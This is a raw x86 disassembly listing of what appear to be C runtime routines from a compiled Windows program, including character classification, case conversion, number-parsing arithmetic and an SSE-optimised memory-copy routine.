  4270d0:	pop    ebp
  4270d1:	ret    
  4270d2:	push   ebp
  4270d3:	mov    ebp,esp
  4270d5:	push   edi
  4270d6:	mov    edi,DWORD PTR [ebp+0xc]
  4270d9:	test   edi,edi
  4270db:	je     0x4270f7
  4270dd:	push   esi
  4270de:	mov    esi,DWORD PTR [ebp+0x8]
  4270e1:	push   esi
  4270e2:	call   0x422a80
  4270e7:	inc    eax
  4270e8:	push   eax
  4270e9:	lea    eax,[esi+edi*1]
  4270ec:	push   esi
  4270ed:	push   eax
  4270ee:	call   0x4274f0
  4270f3:	add    esp,0x10
  4270f6:	pop    esi
  4270f7:	pop    edi
  4270f8:	pop    ebp
  4270f9:	ret    
  4270fa:	push   esi
  4270fb:	push   0x30000
  427100:	push   0x10000
  427105:	xor    esi,esi
  427107:	push   esi
  427108:	call   0x427f7f
  42710d:	add    esp,0xc
  427110:	test   eax,eax
  427112:	jne    0x427116
  427114:	pop    esi
  427115:	ret    
  427116:	push   esi
  427117:	push   esi
  427118:	push   esi
  427119:	push   esi
  42711a:	push   esi
  42711b:	call   0x41fb45
  427120:	int3   
  427121:	push   ebp
  427122:	mov    ebp,esp
  427124:	sub    esp,0x1c
  427127:	push   ebx
  427128:	mov    ebx,DWORD PTR [ebp+0x10]
  42712b:	xor    edx,edx
  42712d:	mov    eax,0x404e
  427132:	push   esi
  427133:	push   edi
  427134:	mov    DWORD PTR [ebp-0x4],eax
  427137:	mov    DWORD PTR [ebx],edx
  427139:	mov    DWORD PTR [ebx+0x4],edx
  42713c:	mov    DWORD PTR [ebx+0x8],edx
  42713f:	cmp    DWORD PTR [ebp+0xc],edx
  427142:	jbe    0x427284
  427148:	mov    ecx,edx
  42714a:	mov    DWORD PTR [ebp+0x10],edx
  42714d:	mov    DWORD PTR [ebp-0xc],ecx
  427150:	mov    DWORD PTR [ebp-0x8],edx
  427153:	mov    edx,DWORD PTR [ebp-0xc]
  427156:	lea    edi,[ebp-0x1c]
  427159:	mov    esi,ebx
  42715b:	mov    eax,ecx
  42715d:	shr    eax,0x1f
  427160:	add    edx,edx
  427162:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427163:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427164:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427165:	mov    esi,DWORD PTR [ebp+0x10]
  427168:	mov    ecx,esi
  42716a:	mov    edi,DWORD PTR [ebp-0x8]
  42716d:	add    esi,esi
  42716f:	or     esi,eax
  427171:	shr    ecx,0x1f
  427174:	add    edi,edi
  427176:	mov    eax,edx
  427178:	or     edi,ecx
  42717a:	shr    eax,0x1f
  42717d:	mov    ecx,esi
  42717f:	add    edx,edx
  427181:	add    esi,esi
  427183:	shr    ecx,0x1f
  427186:	or     esi,eax
  427188:	mov    DWORD PTR [ebx],edx
  42718a:	mov    eax,DWORD PTR [ebp-0x1c]
  42718d:	add    edi,edi
  42718f:	or     edi,ecx
  427191:	mov    DWORD PTR [ebx+0x4],esi
  427194:	add    eax,edx
  427196:	mov    DWORD PTR [ebx+0x8],edi
  427199:	xor    ecx,ecx
  42719b:	mov    DWORD PTR [ebp+0x10],eax
  42719e:	cmp    eax,edx
  4271a0:	jb     0x4271a7
  4271a2:	cmp    eax,DWORD PTR [ebp-0x1c]
  4271a5:	jae    0x4271aa
  4271a7:	xor    ecx,ecx
  4271a9:	inc    ecx
  4271aa:	mov    DWORD PTR [ebx],eax
  4271ac:	test   ecx,ecx
  4271ae:	je     0x4271ce
  4271b0:	mov    eax,esi
  4271b2:	xor    ecx,ecx
  4271b4:	lea    esi,[eax+0x1]
  4271b7:	cmp    esi,eax
  4271b9:	jb     0x4271c0
  4271bb:	cmp    esi,0x1
  4271be:	jae    0x4271c3
  4271c0:	xor    ecx,ecx
  4271c2:	inc    ecx
  4271c3:	mov    DWORD PTR [ebx+0x4],esi
  4271c6:	test   ecx,ecx
  4271c8:	je     0x4271ce
  4271ca:	inc    edi
  4271cb:	mov    DWORD PTR [ebx+0x8],edi
  4271ce:	mov    edx,DWORD PTR [ebp-0x18]
  4271d1:	xor    eax,eax
  4271d3:	lea    ecx,[esi+edx*1]
  4271d6:	mov    DWORD PTR [ebp-0xc],ecx
  4271d9:	cmp    ecx,esi
  4271db:	jb     0x4271e1
  4271dd:	cmp    ecx,edx
  4271df:	jae    0x4271e4
  4271e1:	xor    eax,eax
  4271e3:	inc    eax
  4271e4:	mov    DWORD PTR [ebx+0x4],ecx
  4271e7:	test   eax,eax
  4271e9:	je     0x4271ef
  4271eb:	inc    edi
  4271ec:	mov    DWORD PTR [ebx+0x8],edi
  4271ef:	mov    edx,DWORD PTR [ebp+0x10]
  4271f2:	mov    eax,edx
  4271f4:	mov    esi,DWORD PTR [ebp-0xc]
  4271f7:	add    edx,edx
  4271f9:	add    edi,DWORD PTR [ebp-0x14]
  4271fc:	add    esi,esi
  4271fe:	and    DWORD PTR [ebp-0x10],0x0
  427202:	add    edi,edi
  427204:	shr    eax,0x1f
  427207:	or     esi,eax
  427209:	shr    ecx,0x1f
  42720c:	mov    eax,DWORD PTR [ebp+0x8]
  42720f:	or     edi,ecx
  427211:	mov    DWORD PTR [ebx],edx
  427213:	mov    DWORD PTR [ebx+0x4],esi
  427216:	mov    DWORD PTR [ebx+0x8],edi
  427219:	movsx  eax,BYTE PTR [eax]
  42721c:	mov    DWORD PTR [ebp+0x10],esi
  42721f:	mov    DWORD PTR [ebp-0x8],edi
  427222:	mov    DWORD PTR [ebp-0x1c],eax
  427225:	lea    ecx,[edx+eax*1]
  427228:	mov    DWORD PTR [ebp-0xc],ecx
  42722b:	cmp    ecx,edx
  42722d:	jb     0x427233
  42722f:	cmp    ecx,eax
  427231:	jae    0x427238
  427233:	xor    eax,eax
  427235:	inc    eax
  427236:	jmp    0x42723b
  427238:	mov    eax,DWORD PTR [ebp-0x10]
  42723b:	mov    DWORD PTR [ebx],ecx
  42723d:	test   eax,eax
  42723f:	je     0x427265
  427241:	mov    eax,esi
  427243:	xor    edx,edx
  427245:	lea    esi,[eax+0x1]
  427248:	mov    DWORD PTR [ebp+0x10],esi
  42724b:	cmp    esi,eax
  42724d:	jb     0x427254
  42724f:	cmp    esi,0x1
  427252:	jae    0x427257
  427254:	xor    edx,edx
  427256:	inc    edx
  427257:	mov    DWORD PTR [ebx+0x4],esi
  42725a:	test   edx,edx
  42725c:	je     0x427265
  42725e:	inc    edi
  42725f:	mov    DWORD PTR [ebp-0x8],edi
  427262:	mov    DWORD PTR [ebx+0x8],edi
  427265:	mov    eax,DWORD PTR [ebp+0xc]
  427268:	dec    eax
  427269:	mov    DWORD PTR [ebx+0x4],esi
  42726c:	inc    DWORD PTR [ebp+0x8]
  42726f:	mov    DWORD PTR [ebx+0x8],edi
  427272:	mov    DWORD PTR [ebp+0xc],eax
  427275:	test   eax,eax
  427277:	jne    0x427153
  42727d:	mov    eax,0x404e
  427282:	xor    edx,edx
  427284:	cmp    DWORD PTR [ebx+0x8],edx
  427287:	jne    0x4272b7
  427289:	mov    edx,DWORD PTR [ebx+0x4]
  42728c:	mov    ecx,DWORD PTR [ebx]
  42728e:	mov    esi,edx
  427290:	mov    eax,ecx
  427292:	shl    edx,0x10
  427295:	shr    eax,0x10
  427298:	or     edx,eax
  42729a:	shr    esi,0x10
  42729d:	mov    eax,DWORD PTR [ebp-0x4]
  4272a0:	shl    ecx,0x10
  4272a3:	add    eax,0xfff0
  4272a8:	mov    DWORD PTR [ebx],ecx
  4272aa:	mov    DWORD PTR [ebp-0x4],eax
  4272ad:	test   esi,esi
  4272af:	je     0x42728c
  4272b1:	mov    DWORD PTR [ebx+0x4],edx
  4272b4:	mov    DWORD PTR [ebx+0x8],esi
  4272b7:	mov    edx,DWORD PTR [ebx+0x8]
  4272ba:	test   edx,0x8000
  4272c0:	jne    0x4272f6
  4272c2:	mov    edi,DWORD PTR [ebx]
  4272c4:	mov    esi,DWORD PTR [ebx+0x4]
  4272c7:	mov    eax,edi
  4272c9:	mov    ecx,esi
  4272cb:	shr    eax,0x1f
  4272ce:	add    esi,esi
  4272d0:	or     esi,eax
  4272d2:	shr    ecx,0x1f
  4272d5:	mov    eax,DWORD PTR [ebp-0x4]
  4272d8:	add    edx,edx
  4272da:	or     edx,ecx
  4272dc:	add    eax,0xffff
  4272e1:	add    edi,edi
  4272e3:	mov    DWORD PTR [ebp-0x4],eax
  4272e6:	test   edx,0x8000
  4272ec:	je     0x4272c7
  4272ee:	mov    DWORD PTR [ebx],edi
  4272f0:	mov    DWORD PTR [ebx+0x4],esi
  4272f3:	mov    DWORD PTR [ebx+0x8],edx
  4272f6:	pop    edi
  4272f7:	pop    esi
  4272f8:	mov    WORD PTR [ebx+0xa],ax
  4272fc:	pop    ebx
  4272fd:	mov    esp,ebp
  4272ff:	pop    ebp
  427300:	ret    
  427301:	push   ebp
  427302:	mov    ebp,esp
  427304:	sub    esp,0x10
  427307:	push   DWORD PTR [ebp+0xc]
  42730a:	lea    ecx,[ebp-0x10]
  42730d:	call   0x4207b2
  427312:	mov    ecx,DWORD PTR [ebp-0x10]
  427315:	cmp    DWORD PTR [ecx+0x74],0x1
  427319:	jle    0x427330
  42731b:	lea    eax,[ebp-0x10]
  42731e:	push   eax
  42731f:	push   0x4
  427321:	push   DWORD PTR [ebp+0x8]
  427324:	call   0x4216a2
  427329:	add    esp,0xc
  42732c:	mov    ecx,eax
  42732e:	jmp    0x427340
  427330:	mov    ecx,DWORD PTR [ecx+0x90]
  427336:	mov    eax,DWORD PTR [ebp+0x8]
  427339:	movzx  ecx,WORD PTR [ecx+eax*2]
  42733d:	and    ecx,0x4
  427340:	cmp    BYTE PTR [ebp-0x4],0x0
  427344:	je     0x42734d
  427346:	mov    eax,DWORD PTR [ebp-0x8]
  427349:	and    DWORD PTR [eax+0x70],0xfffffffd
  42734d:	mov    eax,ecx
  42734f:	mov    esp,ebp
  427351:	pop    ebp
  427352:	ret    
  427353:	push   ebp
  427354:	mov    ebp,esp
  427356:	cmp    DWORD PTR ds:0x432b1c,0x0
  42735d:	jne    0x427370
  42735f:	mov    ecx,DWORD PTR [ebp+0x8]
  427362:	mov    eax,ds:0x430b80
  427367:	movzx  eax,WORD PTR [eax+ecx*2]
  42736b:	and    eax,0x4
  42736e:	pop    ebp
  42736f:	ret    
  427370:	push   0x0
  427372:	push   DWORD PTR [ebp+0x8]
  427375:	call   0x427301
  42737a:	pop    ecx
  42737b:	pop    ecx
  42737c:	pop    ebp
  42737d:	ret    
  42737e:	push   ebp
  42737f:	mov    ebp,esp
  427381:	sub    esp,0x18
  427384:	lea    ecx,[ebp-0x18]
  427387:	push   ebx
  427388:	push   edi
  427389:	push   DWORD PTR [ebp+0xc]
  42738c:	call   0x4207b2
  427391:	mov    ebx,DWORD PTR [ebp+0x8]
  427394:	mov    edi,0x100
  427399:	cmp    ebx,edi
  42739b:	jae    0x4273fd
  42739d:	mov    ecx,DWORD PTR [ebp-0x18]
  4273a0:	cmp    DWORD PTR [ecx+0x74],0x1
  4273a4:	jle    0x4273ba
  4273a6:	lea    eax,[ebp-0x18]
  4273a9:	push   eax
  4273aa:	push   0x1
  4273ac:	push   ebx
  4273ad:	call   0x4216a2
  4273b2:	mov    ecx,DWORD PTR [ebp-0x18]
  4273b5:	add    esp,0xc
  4273b8:	jmp    0x4273c7
  4273ba:	mov    eax,DWORD PTR [ecx+0x90]
  4273c0:	movzx  eax,WORD PTR [eax+ebx*2]
  4273c4:	and    eax,0x1
  4273c7:	test   eax,eax
  4273c9:	je     0x4273e9
  4273cb:	cmp    BYTE PTR [ebp-0xc],0x0
  4273cf:	mov    eax,DWORD PTR [ecx+0x94]
  4273d5:	movzx  ecx,BYTE PTR [eax+ebx*1]
  4273d9:	je     0x4273e2
  4273db:	mov    eax,DWORD PTR [ebp-0x10]
  4273de:	and    DWORD PTR [eax+0x70],0xfffffffd
  4273e2:	mov    eax,ecx
  4273e4:	jmp    0x4274bb
  4273e9:	cmp    BYTE PTR [ebp-0xc],0x0
  4273ed:	je     0x4273f6
  4273ef:	mov    ecx,DWORD PTR [ebp-0x10]
  4273f2:	and    DWORD PTR [ecx+0x70],0xfffffffd
  4273f6:	mov    eax,ebx
  4273f8:	jmp    0x4274bb
  4273fd:	mov    eax,DWORD PTR [ebp-0x18]
  427400:	cmp    DWORD PTR [eax+0x74],0x1
  427404:	jle    0x427433
  427406:	mov    eax,ebx
  427408:	lea    ecx,[ebp-0x18]
  42740b:	sar    eax,0x8
  42740e:	mov    DWORD PTR [ebp+0x8],eax
  427411:	push   ecx
  427412:	movzx  eax,al
  427415:	push   eax
  427416:	call   0x4218f9
  42741b:	pop    ecx
  42741c:	pop    ecx
  42741d:	test   eax,eax
  42741f:	je     0x427433
  427421:	mov    eax,DWORD PTR [ebp+0x8]
  427424:	push   0x2
  427426:	mov    BYTE PTR [ebp-0x4],al
  427429:	mov    BYTE PTR [ebp-0x3],bl
  42742c:	mov    BYTE PTR [ebp-0x2],0x0
  427430:	pop    ecx
  427431:	jmp    0x427448
  427433:	call   0x41fb32
  427438:	xor    ecx,ecx
  42743a:	inc    ecx
  42743b:	mov    DWORD PTR [eax],0x2a
  427441:	mov    BYTE PTR [ebp-0x4],bl
  427444:	mov    BYTE PTR [ebp-0x3],0x0
  427448:	mov    eax,DWORD PTR [ebp-0x18]
  42744b:	lea    edx,[ebp-0x8]
  42744e:	push   0x1
  427450:	push   DWORD PTR [eax+0x4]
  427453:	push   0x3
  427455:	push   edx
  427456:	push   ecx
  427457:	lea    ecx,[ebp-0x4]
  42745a:	push   ecx
  42745b:	push   edi
  42745c:	push   DWORD PTR [eax+0xa8]
  427462:	lea    eax,[ebp-0x18]
  427465:	push   eax
  427466:	call   0x4215f5
  42746b:	add    esp,0x24
  42746e:	test   eax,eax
  427470:	jne    0x427487
  427472:	cmp    BYTE PTR [ebp-0xc],al
  427475:	je     0x4273f6
  42747b:	mov    eax,DWORD PTR [ebp-0x10]
  42747e:	and    DWORD PTR [eax+0x70],0xfffffffd
  427482:	jmp    0x4273f6
  427487:	cmp    eax,0x1
  42748a:	jne    0x42749f
  42748c:	cmp    BYTE PTR [ebp-0xc],0x0
  427490:	movzx  eax,BYTE PTR [ebp-0x8]
  427494:	je     0x4274bb
  427496:	mov    ecx,DWORD PTR [ebp-0x10]
  427499:	and    DWORD PTR [ecx+0x70],0xfffffffd
  42749d:	jmp    0x4274bb
  42749f:	movzx  edx,BYTE PTR [ebp-0x8]
  4274a3:	movzx  eax,BYTE PTR [ebp-0x7]
  4274a7:	shl    edx,0x8
  4274aa:	or     edx,eax
  4274ac:	cmp    BYTE PTR [ebp-0xc],0x0
  4274b0:	je     0x4274b9
  4274b2:	mov    ecx,DWORD PTR [ebp-0x10]
  4274b5:	and    DWORD PTR [ecx+0x70],0xfffffffd
  4274b9:	mov    eax,edx
  4274bb:	pop    edi
  4274bc:	pop    ebx
  4274bd:	mov    esp,ebp
  4274bf:	pop    ebp
  4274c0:	ret    
  4274c1:	push   ebp
  4274c2:	mov    ebp,esp
  4274c4:	cmp    DWORD PTR ds:0x432b1c,0x0
  4274cb:	jne    0x4274df
  4274cd:	mov    ecx,DWORD PTR [ebp+0x8]
  4274d0:	lea    eax,[ecx-0x41]
  4274d3:	cmp    eax,0x19
  4274d6:	ja     0x4274db
  4274d8:	add    ecx,0x20
  4274db:	mov    eax,ecx
  4274dd:	pop    ebp
  4274de:	ret    
  4274df:	push   0x0
  4274e1:	push   DWORD PTR [ebp+0x8]
  4274e4:	call   0x42737e
  4274e9:	pop    ecx
  4274ea:	pop    ecx
  4274eb:	pop    ebp
  4274ec:	ret    
  4274ed:	int3   
  4274ee:	int3   
  4274ef:	int3   
  4274f0:	push   edi
  4274f1:	push   esi
  4274f2:	mov    esi,DWORD PTR [esp+0x10]
  4274f6:	mov    ecx,DWORD PTR [esp+0x14]
  4274fa:	mov    edi,DWORD PTR [esp+0xc]
  4274fe:	mov    eax,ecx
  427500:	mov    edx,ecx
  427502:	add    eax,esi
  427504:	cmp    edi,esi
  427506:	jbe    0x427510
  427508:	cmp    edi,eax
  42750a:	jb     0x427878
  427510:	bt     DWORD PTR ds:0x432b24,0x1
  427518:	jae    0x427521
  42751a:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42751c:	jmp    0x427838
  427521:	cmp    ecx,0x80
  427527:	jb     0x4276fb
  42752d:	mov    eax,edi
  42752f:	xor    eax,esi
  427531:	test   eax,0xf
  427536:	jne    0x427546
  427538:	bt     DWORD PTR ds:0x431580,0x1
  427540:	jb     0x427a20
  427546:	bt     DWORD PTR ds:0x432b24,0x0
  42754e:	jae    0x4276fb
  427554:	test   edi,0x3
  42755a:	jne    0x427718
  427560:	test   esi,0x3
  427566:	jne    0x427703
  42756c:	bt     edi,0x2
  427570:	jae    0x42757f
  427572:	mov    eax,DWORD PTR [esi]
  427574:	sub    ecx,0x4
  427577:	lea    esi,[esi+0x4]
  42757a:	mov    DWORD PTR [edi],eax
  42757c:	lea    edi,[edi+0x4]
  42757f:	bt     edi,0x3
  427583:	jae    0x427596
  427585:	movq   xmm1,QWORD PTR [esi]
  427589:	sub    ecx,0x8
  42758c:	lea    esi,[esi+0x8]
  42758f:	movq   QWORD PTR [edi],xmm1
  427593:	lea    edi,[edi+0x8]
  427596:	test   esi,0x7
  42759c:	je     0x427601
  42759e:	bt     esi,0x3
  4275a2:	jae    0x42765a
  4275a8:	movdqa xmm1,XMMWORD PTR [esi-0xc]
  4275ad:	lea    esi,[esi-0xc]
  4275b0:	movdqa xmm3,XMMWORD PTR [esi+0x10]
  4275b5:	sub    ecx,0x30
  4275b8:	movdqa xmm0,XMMWORD PTR [esi+0x20]
  4275bd:	movdqa xmm5,XMMWORD PTR [esi+0x30]
  4275c2:	lea    esi,[esi+0x30]
  4275c5:	cmp    ecx,0x30
  4275c8:	movdqa xmm2,xmm3
  4275cc:	palignr xmm3,xmm1,0xc
  4275d2:	movdqa XMMWORD PTR [edi],xmm3
  4275d6:	movdqa xmm4,xmm0
  4275da:	palignr xmm0,xmm2,0xc
  4275e0:	movdqa XMMWORD PTR [edi+0x10],xmm0
  4275e5:	movdqa xmm1,xmm5
  4275e9:	palignr xmm5,xmm4,0xc
  4275ef:	movdqa XMMWORD PTR [edi+0x20],xmm5
  4275f4:	lea    edi,[edi+0x30]
  4275f7:	jge    0x4275b0
  4275f9:	lea    esi,[esi+0xc]
  4275fc:	jmp    0x4276b0
  427601:	movdqa xmm1,XMMWORD PTR [esi-0x8]
  427606:	lea    esi,[esi-0x8]
  427609:	lea    ecx,[ecx+0x0]
  42760c:	movdqa xmm3,XMMWORD PTR [esi+0x10]
  427611:	sub    ecx,0x30
  427614:	movdqa xmm0,XMMWORD PTR [esi+0x20]
  427619:	movdqa xmm5,XMMWORD PTR [esi+0x30]
  42761e:	lea    esi,[esi+0x30]
  427621:	cmp    ecx,0x30
  427624:	movdqa xmm2,xmm3
  427628:	palignr xmm3,xmm1,0x8
  42762e:	movdqa XMMWORD PTR [edi],xmm3
  427632:	movdqa xmm4,xmm0
  427636:	palignr xmm0,xmm2,0x8
  42763c:	movdqa XMMWORD PTR [edi+0x10],xmm0
  427641:	movdqa xmm1,xmm5
  427645:	palignr xmm5,xmm4,0x8
  42764b:	movdqa XMMWORD PTR [edi+0x20],xmm5
  427650:	lea    edi,[edi+0x30]
  427653:	jge    0x42760c
  427655:	lea    esi,[esi+0x8]
  427658:	jmp    0x4276b0
  42765a:	movdqa xmm1,XMMWORD PTR [esi-0x4]
  42765f:	lea    esi,[esi-0x4]
  427662:	mov    edi,edi
  427664:	movdqa xmm3,XMMWORD PTR [esi+0x10]
  427669:	sub    ecx,0x30
  42766c:	movdqa xmm0,XMMWORD PTR [esi+0x20]
  427671:	movdqa xmm5,XMMWORD PTR [esi+0x30]
  427676:	lea    esi,[esi+0x30]
  427679:	cmp    ecx,0x30
  42767c:	movdqa xmm2,xmm3
  427680:	palignr xmm3,xmm1,0x4
  427686:	movdqa XMMWORD PTR [edi],xmm3
  42768a:	movdqa xmm4,xmm0
  42768e:	palignr xmm0,xmm2,0x4
  427694:	movdqa XMMWORD PTR [edi+0x10],xmm0
  427699:	movdqa xmm1,xmm5
  42769d:	palignr xmm5,xmm4,0x4
  4276a3:	movdqa XMMWORD PTR [edi+0x20],xmm5
  4276a8:	lea    edi,[edi+0x30]
  4276ab:	jge    0x427664
  4276ad:	lea    esi,[esi+0x4]
  4276b0:	cmp    ecx,0x10
  4276b3:	jl     0x4276c8
  4276b5:	movdqu xmm1,XMMWORD PTR [esi]
  4276b9:	sub    ecx,0x10
  4276bc:	lea    esi,[esi+0x10]
  4276bf:	movdqa XMMWORD PTR [edi],xmm1
  4276c3:	lea    edi,[edi+0x10]
  4276c6:	jmp    0x4276b0
  4276c8:	bt     ecx,0x2
  4276cc:	jae    0x4276db
  4276ce:	mov    eax,DWORD PTR [esi]
  4276d0:	sub    ecx,0x4
  4276d3:	lea    esi,[esi+0x4]
  4276d6:	mov    DWORD PTR [edi],eax
  4276d8:	lea    edi,[edi+0x4]
  4276db:	bt     ecx,0x3
  4276df:	jae    0x4276f2
  4276e1:	movq   xmm1,QWORD PTR [esi]
  4276e5:	sub    ecx,0x8
  4276e8:	lea    esi,[esi+0x8]
  4276eb:	movq   QWORD PTR [edi],xmm1
  4276ef:	lea    edi,[edi+0x8]
  4276f2:	mov    eax,DWORD PTR [ecx*4+0x427828]
  4276f9:	jmp    eax
  4276fb:	test   edi,0x3
  427701:	jne    0x427718
  427703:	shr    ecx,0x2
  427706:	and    edx,0x3
  427709:	cmp    ecx,0x8
  42770c:	jb     0x427738
  42770e:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427710:	jmp    DWORD PTR [edx*4+0x427828]
  427717:	nop
  427718:	mov    eax,edi
  42771a:	mov    edx,0x3
  42771f:	sub    ecx,0x4
  427722:	jb     0x427730
  427724:	and    eax,0x3
  427727:	add    ecx,eax
  427729:	jmp    DWORD PTR [eax*4+0x42773c]
  427730:	jmp    DWORD PTR [ecx*4+0x427838]
  427737:	nop
  427738:	jmp    DWORD PTR [ecx*4+0x4277bc]
  42773f:	nop
  427740:	dec    esp
  427741:	ja     0x427785
  427743:	add    BYTE PTR [eax+0x77],bh
  427746:	inc    edx
  427747:	add    BYTE PTR [edi+esi*2-0x2edcffbe],bl
  42774e:	mov    al,BYTE PTR [esi]
  427750:	mov    BYTE PTR [edi],al
  427752:	mov    al,BYTE PTR [esi+0x1]
  427755:	mov    BYTE PTR [edi+0x1],al
  427758:	mov    al,BYTE PTR [esi+0x2]
  42775b:	shr    ecx,0x2
  42775e:	mov    BYTE PTR [edi+0x2],al
  427761:	add    esi,0x3
  427764:	add    edi,0x3
  427767:	cmp    ecx,0x8
  42776a:	jb     0x427738
  42776c:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42776e:	jmp    DWORD PTR [edx*4+0x427828]
  427775:	lea    ecx,[ecx+0x0]
  427778:	and    edx,ecx
  42777a:	mov    al,BYTE PTR [esi]
  42777c:	mov    BYTE PTR [edi],al
  42777e:	mov    al,BYTE PTR [esi+0x1]
  427781:	shr    ecx,0x2
  427784:	mov    BYTE PTR [edi+0x1],al
  427787:	add    esi,0x2
  42778a:	add    edi,0x2
  42778d:	cmp    ecx,0x8
  427790:	jb     0x427738
  427792:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427794:	jmp    DWORD PTR [edx*4+0x427828]
  42779b:	nop
  42779c:	and    edx,ecx
  42779e:	mov    al,BYTE PTR [esi]
  4277a0:	mov    BYTE PTR [edi],al
  4277a2:	add    esi,0x1
  4277a5:	shr    ecx,0x2
  4277a8:	add    edi,0x1
  4277ab:	cmp    ecx,0x8
  4277ae:	jb     0x427738
  4277b0:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4277b2:	jmp    DWORD PTR [edx*4+0x427828]
  4277b9:	lea    ecx,[ecx+0x0]
  4277bc:	pop    ds
  4277bd:	js     0x427801
  4277bf:	add    BYTE PTR [eax+edi*2],cl
  4277c2:	inc    edx
  4277c3:	add    BYTE PTR [eax+edi*2],al
  4277c6:	inc    edx
  4277c7:	add    ah,bh
  4277c9:	ja     0x42780d
  4277cb:	add    ah,dh
  4277cd:	ja     0x427811
  4277cf:	add    ah,ch
  4277d1:	ja     0x427815
  4277d3:	add    ah,ah
  4277d5:	ja     0x427819
  4277d7:	add    ah,bl
  4277d9:	ja     0x42781d
  4277db:	add    BYTE PTR [ebx-0x761b71bc],cl
  4277e1:	inc    esp
  4277e2:	(bad)  
  4277e3:	in     al,0x8b
  4277e5:	inc    esp
  4277e6:	mov    gs,eax
  4277e8:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4277ec:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4277f0:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4277f4:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4277f8:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4277fc:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  427800:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  427804:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  427808:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  42780c:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  427810:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  427814:	lea    eax,[ecx*4+0x0]
  42781b:	add    esi,eax
  42781d:	add    edi,eax
  42781f:	jmp    DWORD PTR [edx*4+0x427828]
  427826:	mov    edi,edi
  427828:	cmp    BYTE PTR [eax+0x42],bh
  42782b:	add    BYTE PTR [eax+0x78],al
  42782e:	inc    edx
  42782f:	add    BYTE PTR [eax+edi*2+0x42],cl
  427833:	add    BYTE PTR [eax+0x78],ah
  427836:	inc    edx
  427837:	add    BYTE PTR [ebx+0x5e0c2444],cl
  42783d:	pop    edi
  42783e:	ret    
  42783f:	nop
  427840:	mov    al,BYTE PTR [esi]
  427842:	mov    BYTE PTR [edi],al
  427844:	mov    eax,DWORD PTR [esp+0xc]
  427848:	pop    esi
  427849:	pop    edi
  42784a:	ret    
  42784b:	nop
  42784c:	mov    al,BYTE PTR [esi]
  42784e:	mov    BYTE PTR [edi],al
  427850:	mov    al,BYTE PTR [esi+0x1]
  427853:	mov    BYTE PTR [edi+0x1],al
  427856:	mov    eax,DWORD PTR [esp+0xc]
  42785a:	pop    esi
  42785b:	pop    edi
  42785c:	ret    
  42785d:	lea    ecx,[ecx+0x0]
  427860:	mov    al,BYTE PTR [esi]
  427862:	mov    BYTE PTR [edi],al
  427864:	mov    al,BYTE PTR [esi+0x1]
  427867:	mov    BYTE PTR [edi+0x1],al
  42786a:	mov    al,BYTE PTR [esi+0x2]
  42786d:	mov    BYTE PTR [edi+0x2],al
  427870:	mov    eax,DWORD PTR [esp+0xc]
  427874:	pop    esi
  427875:	pop    edi
  427876:	ret    
  427877:	nop
  427878:	lea    esi,[ecx+esi*1-0x4]
  42787c:	lea    edi,[ecx+edi*1-0x4]
  427880:	test   edi,0x3
  427886:	jne    0x4278ac
  427888:	shr    ecx,0x2
  42788b:	and    edx,0x3
  42788e:	cmp    ecx,0x8
  427891:	jb     0x4278a0
  427893:	std    
  427894:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427896:	cld    
  427897:	jmp    DWORD PTR [edx*4+0x4279c4]
  42789e:	mov    edi,edi
  4278a0:	neg    ecx
  4278a2:	jmp    DWORD PTR [ecx*4+0x427974]
  4278a9:	lea    ecx,[ecx+0x0]
  4278ac:	mov    eax,edi
  4278ae:	mov    edx,0x3
  4278b3:	cmp    ecx,0x4
  4278b6:	jb     0x4278c4
  4278b8:	and    eax,0x3
  4278bb:	sub    ecx,eax
  4278bd:	jmp    DWORD PTR [eax*4+0x4278c8]
  4278c4:	jmp    DWORD PTR [ecx*4+0x4279c4]
  4278cb:	nop
  4278cc:	fdivr  DWORD PTR [eax+0x42]
  4278cf:	add    ah,bh
  4278d1:	js     0x427915
  4278d3:	add    BYTE PTR [ecx+edi*2],ah
  4278d6:	inc    edx
  4278d7:	add    BYTE PTR [edx-0x2edcfcba],cl
  4278dd:	mov    BYTE PTR [edi+0x3],al
  4278e0:	sub    esi,0x1
  4278e3:	shr    ecx,0x2
  4278e6:	sub    edi,0x1
  4278e9:	cmp    ecx,0x8
  4278ec:	jb     0x4278a0
  4278ee:	std    
  4278ef:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4278f1:	cld    
  4278f2:	jmp    DWORD PTR [edx*4+0x4279c4]
  4278f9:	lea    ecx,[ecx+0x0]
  4278fc:	mov    al,BYTE PTR [esi+0x3]
  4278ff:	and    edx,ecx
  427901:	mov    BYTE PTR [edi+0x3],al
  427904:	mov    al,BYTE PTR [esi+0x2]
  427907:	shr    ecx,0x2
  42790a:	mov    BYTE PTR [edi+0x2],al
  42790d:	sub    esi,0x2
  427910:	sub    edi,0x2
  427913:	cmp    ecx,0x8
  427916:	jb     0x4278a0
  427918:	std    
  427919:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42791b:	cld    
  42791c:	jmp    DWORD PTR [edx*4+0x4279c4]
  427923:	nop
  427924:	mov    al,BYTE PTR [esi+0x3]
  427927:	and    edx,ecx
  427929:	mov    BYTE PTR [edi+0x3],al
  42792c:	mov    al,BYTE PTR [esi+0x2]
  42792f:	mov    BYTE PTR [edi+0x2],al
  427932:	mov    al,BYTE PTR [esi+0x1]
  427935:	shr    ecx,0x2
  427938:	mov    BYTE PTR [edi+0x1],al
  42793b:	sub    esi,0x3
  42793e:	sub    edi,0x3
